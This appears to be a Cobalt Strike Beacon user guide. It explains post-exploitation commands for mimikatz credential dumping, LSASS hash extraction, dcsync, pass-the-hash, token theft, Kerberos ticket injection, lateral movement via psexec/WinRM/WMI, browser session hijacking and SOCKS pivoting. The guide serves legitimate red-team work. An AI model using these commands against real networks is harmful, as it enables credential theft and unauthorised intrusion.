### Beacon Integration with Mimikatz

Beacon integrates with mimikatz, allowing you to pass any command to mimikatz’s command dispatcher. For example, `mimikatz standard::coffee` will simulate a humorous action (like getting a cup of coffee). Beacon ensures that the injected mimikatz instance matches the native architecture of your target.

#### Running Commands as SYSTEM
Some mimikatz commands require SYSTEM-level privileges to function. To force mimikatz to elevate to SYSTEM before running your command, prefix the command with an exclamation mark (`!`). For example, `mimikatz !lsa::cache` will recover salted password hashes cached by the system.

#### Impersonating Beacon’s Current Access Token
Occasionally, you may need to run a mimikatz command using Beacon’s current access token. Prefix the command with an at symbol (`@`) to force mimikatz to impersonate Beacon’s current access token. For example, `mimikatz @lsadump::dcsync` will run the dcsync command in mimikatz with Beacon’s current access token.

### Credential and Hash Harvesting

To dump password hashes, navigate to `[beacon] -> Access -> Dump Hashes` or use the `hashdump` command from the Beacon console. These commands inject into the LSASS process and extract password hashes for local users on the current system.

The `logonpasswords` command uses mimikatz to recover plaintext passwords and hashes for users currently logged on to the system. This command is equivalent to `[beacon] -> Access -> Run Mimikatz`.

To pull password hashes for all accounts from a domain controller, use `dcsync [DOMAIN.FQDN]`. This technique leverages Windows APIs designed for syncing information between domain controllers and requires a domain administrator trust relationship. For a specific user, use `dcsync [DOMAIN.FQDN] [DOMAIN\user]`.

Credentials obtained through these commands are collected by Cobalt Strike and stored in the credentials data model. You can view them by navigating to `View -> Credentials`.

### Port Scanning

Beacon includes a built-in port scanner. Use the `portscan [targets] [ports] [discovery method]` command to start a port scanning job. You can specify a comma-separated list of target ranges and ports. For example, `portscan 172.16.48.0/24 1-1024,8080` will scan hosts from 172.16.48.0 to 172.16.48.255 on ports 1 to 1024 and 8080.

There are three discovery methods:
- `arp`: Uses ARP requests to determine if a host is alive.
- `icmp`: Sends ICMP echo requests to check if a target is alive.
- `none`: Assumes all hosts are alive.

The port scanner runs between Beacon check-ins and sends results to the Beacon console. Cobalt Strike processes this information and updates the targets model with the discovered hosts.

### Network and Host Enumeration

Beacon’s `net` module provides tools for interrogating and discovering targets in a Windows Active Directory network. Use `net dclist` to find the domain controller for the domain the target is joined to, and `net view` to find other targets on the same domain. Both commands populate the targets model. The `net computers` command finds targets by querying computer account groups on a Domain Controller.

These commands are built on top of the Windows Network Enumeration APIs and are direct replacements for many built-in `net` commands in Windows. For example, `net localgroup \\TARGET` lists the groups on another system, and `net localgroup \\TARGET group name` lists the members of a specific group on that system. These commands are useful during lateral movement to identify local administrators on other systems.

Use `help net` to get a list of all commands in Beacon’s `net` module, and `help net [command]` for detailed help on each individual command.

### Trust Relationships

In Windows, single sign-on is managed through access tokens. When a user logs on, an access token is generated, containing information about the user and their rights. This token also holds information needed to authenticate the user to other systems on the network.

- **Impersonate a Token**: Use `steal_token [process id]` to impersonate a token from an existing process. Use `ps` to see which processes are running, and `getuid` to print your current token. Revert to your original token with `rev2self`.
- **Generate a Token**: If you have credentials for a user, use `make_token [DOMAIN\user] [password]` to generate a token with those credentials. This token is a copy of your current token with modified single sign-on information.
- **Pass-the-Hash**: Use `pth [DOMAIN\user] [ntlm hash]` to create and impersonate an access token with the specified NTLM hash.

Beacon’s Make Token dialog (`[beacon] -> Access -> Make Token`) is a front-end for these commands, presenting the contents of the credential model and using the appropriate command to turn the selected credential entry into an access token.

### Kerberos Tickets

- **Inject a Kerberos Ticket**: Use `kerberos_ticket_use [/path/to/ticket]` to inject a Kerberos ticket into the current session, allowing Beacon to interact with remote systems using the rights in the ticket.
- **Clear Kerberos Tickets**: Use `kerberos_ticket_purge` to clear any Kerberos tickets associated with your session.

### Lateral Movement

Once you have a token for a domain admin or a domain user who is a local admin on a target, you can abuse this trust relationship to gain control of the target. Beacon offers several built-in options for lateral movement.

- **List Lateral Movement Options**: Type `jump` to list available options.
- **Run a Payload on a Remote Target**: Use `jump [module] [target] [listener]` to attempt to run a payload on a remote target.

**Jump Modules:**
- `psexec`: x86 - Use a service to run a Service EXE artifact.
- `psexec64`: x64 - Use a service to run a Service EXE artifact.
- `psexec_psh`: x86 - Use a service to run a PowerShell one-liner.
- `winrm`: x86 - Run a PowerShell script via WinRM.
- `winrm64`: x64 - Run a PowerShell script via WinRM.

- **Remote Execution**: Use `remote-exec [module] [target] [command + args]` to run a specified command on a remote target.

**Remote-exec Modules:**
- `psexec`: Remote execute via Service Control Manager.
- `winrm`: Remote execute via WinRM (PowerShell).
- `wmi`: Remote execute via WMI.

Lateral movement, like privilege escalation, involves various attack primitives. The split between `jump` and `remote-exec` allows flexibility in weaponizing execute-only primitives.

### Lateral Movement GUI

Cobalt Strike provides a GUI to simplify lateral movement. Navigate to `Targets Visualization` or `View -> Targets`, then select `[target] -> Jump` and choose your desired option.

- **Trust Relationship**: Decide whether to use the token from one of your Beacons or credentials/hashes for lateral movement. Select credentials from the store or enter the User, Password, and Domain fields.
- **Listener**: Choose the listener for lateral movement; the SMB Beacon is often a good choice.
- **Session**: Select the session to perform the lateral movement from. Each attack must be executed from a compromised system.

Press `Launch` to activate the tab for the selected Beacon and issue the necessary commands. Feedback from the attack will appear in the Beacon console.

### Browser Pivoting

Browser pivoting allows an attacker to hijack authenticated web sessions. Cobalt Strike’s implementation injects an HTTP proxy server into the compromised user’s browser, enabling the attacker to make requests through the user’s browser, which automatically re-authenticates to any site the user is already logged onto.

#### Setup

- **Start Browser Pivoting**: Go to `[beacon] -> Explore -> Browser Pivot` and select the Internet Explorer instance to inject into. Choose the port for the proxy server.
- **Process Injection**: Ensure you inject into a process associated with an open tab to inherit session state. Identify tab processes by checking the PPID value in the setup dialog.

#### Use

- **Configure Browser**: Set up your web browser to use the Browser Pivot Proxy server.
- **SSL Certificates**: Add hosts to the trust store when SSL errors occur. Use a different browser or command-line options to ignore certificate errors, such as `chromium --ignore-certificate-errors --proxy-server=[host]:[port]`.
- **Stop Proxy Server**: Use `browserpivot stop` in the Beacon console to stop the proxy server.

#### How It Works

Internet Explorer delegates communication to the WinINet library, which manages cookies, SSL sessions, and server authentication. By injecting Cobalt Strike’s Browser Pivoting technology into a user’s Internet Explorer instance, you leverage WinINet’s transparent reauthentication on a per-process basis.

### Pivoting

Pivoting turns a compromised system into a hop point for other attacks and tools. Ensure your Beacon is in interactive mode (multiple check-ins per second) using `sleep 0`.

#### SOCKS Proxy

- **Setup**: Go to `[beacon] -> Pivoting -> SOCKS Server` or use `socks [port]` to set up a SOCKS4a proxy server.
- **Tunneling**: Connections through the SOCKS server become tasks for the associated Beacon. Use `socks stop` to disable the proxy server.
- **Proxychains**: Use `proxychains` to force external programs to use the SOCKS proxy server.
- **Metasploit**: Tunnel Metasploit Framework exploits and modules through Beacon using `setg Proxies socks4:team server IP:proxy port` and `setg ReverseAllowProxy true`.

#### Reverse Port Forward

- **Setup**: Use `rportfwd [bind port] [forward host] [forward port]` to bind a port on the compromised target and relay traffic.
- **Local Variation**: Use `rportfwd_local` to initiate a connection from your Cobalt Strike client.
- **Disable**: Use `rportfwd stop [bind port]` to disable the reverse port forward.

#### Spawn and Tunnel

- **Spawn and Tunnel**: Use `spunnel [x86 or x64] [controller host] [controller port] [/path/to/agent.bin]` to spawn a third-party tool and create a reverse port forward.
- **Local Variation**: Use `spunnel_local` to initiate the controller connection from your Cobalt Strike client.

### Interoperability with Core Impact

The `spunnel` commands were designed to tunnel Core Impact's agent through Cobalt Strike's Beacon. Follow the steps in the Core Impact user interface to export a raw agent file and use it with `spunnel x64` or `spunnel_local x64`.

For more information on Core Impact, visit:
- [Core Impact](https://www.coresecurity.com/products/core-impact)

This comprehensive guide should help you effectively use Beacon for various offensive operations.